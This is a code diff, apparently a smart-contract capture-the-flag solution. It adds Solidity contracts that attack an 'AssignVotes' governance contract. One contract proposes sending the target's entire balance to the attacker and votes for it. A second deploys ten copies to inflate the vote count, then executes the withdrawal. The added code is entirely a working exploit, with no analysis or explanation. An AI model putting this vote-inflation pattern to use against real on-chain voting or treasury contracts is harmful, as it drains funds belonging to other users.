@@ -70,3 +70,31 @@ contract AssignVotes {
         require(success, "exec failed");
     }
 }
+
+contract Omaewa1 {
+    constructor(AssignVotes _addy) {
+        _addy.createProposal(msg.sender," ", address(_addy).balance);
+        _addy.assign(address(this));
+        _addy.vote(0);
+       
+        
+    }
+}
+
+
+contract omaewaMaker{
+   
+    constructor(AssignVotes _addy){
+      Omaewa1 o = new Omaewa1(_addy);
+       Omaewa1 om = new Omaewa1(_addy);
+      Omaewa1 omm = new Omaewa1(_addy);
+      Omaewa1 ommm = new Omaewa1(_addy);
+      Omaewa1 ommmm = new Omaewa1(_addy);
+       Omaewa1 ommmmm = new Omaewa1(_addy);
+          Omaewa1 ommmmmm = new Omaewa1(_addy);
+          Omaewa1 ommmmmmm = new Omaewa1(_addy);
+        Omaewa1 ommmmmmmm = new Omaewa1(_addy);
+        Omaewa1 ommmmmmmmm = new Omaewa1(_addy);
+        _addy.execute(0);
+    }
+}
